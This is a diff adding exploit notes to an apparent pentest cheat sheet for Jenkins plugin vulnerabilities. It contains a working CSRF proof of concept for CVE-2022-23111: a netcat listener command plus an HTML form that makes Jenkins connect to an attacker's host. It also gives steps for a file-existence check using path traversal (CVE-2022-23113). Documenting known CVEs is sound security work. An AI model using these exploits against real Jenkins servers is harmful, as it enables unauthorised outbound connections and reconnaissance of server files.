@@ -15,6 +15,7 @@ Search for vulnerable plugins :
 
 ## Missing permission
 
+* * *
 
 ## XSS
 ### Stored XSS vulnerability in Dashboard View Plugin
@@ -41,6 +42,33 @@ Search for vulnerable plugins :
 * * *
 
 ## CSRF
+### CSRF vulnerability in Publish Over SSH Plugin
+- CVE-2022-23111 
+	- Publish Over SSH Plugin 1.22
+	- https://plugins.jenkins.io/publish-over-ssh/
+	- Requires Jenkins 2.263.1
+
+#### Exploit
+- sudo netcat -lvnp 22
+- host this html on a webpage (change the IP by yours)
+
+```html
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost:8080/descriptorByName/jenkins.plugins.publish_over_ssh.BapSshHostConfiguration/testConnection">
+      <input type="hidden" name="name" value="test" />
+      <input type="hidden" name="hostname" value="192&#46;168&#46;1&#46;117" />
+      <input type="hidden" name="username" value="test" />
+      <input type="hidden" name="port" value="22" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+- Go to the webpage, click on the button Submit request
+- If you already are connected to Jenkins, you should see a connection on your listener
+- If you are not connected, Jenkins ask you to connect, then the request get executed and you should see a connection on your listener
 
 * * *
 
@@ -87,6 +115,17 @@ Search for vulnerable plugins :
 * * *
 
 ## Path traversal
+### Path traversal vulnerability in Publish Over SSH Plugin
+- CVE-2022-23113
+	- Publish Over SSH Plugin 1.22
+	- https://plugins.jenkins.io/publish-over-ssh/
+	- Requires Jenkins 2.263.1
+
+#### Exploit
+- Manage Jenkins - Configure System - Go to "Publish over SSH"
+- In the "Path to key" box, enter a file to check for existance
+- If the file doesn't exist on the system : No such file : 'fileName'
+- If the file exist : No error
 
 * * *
 
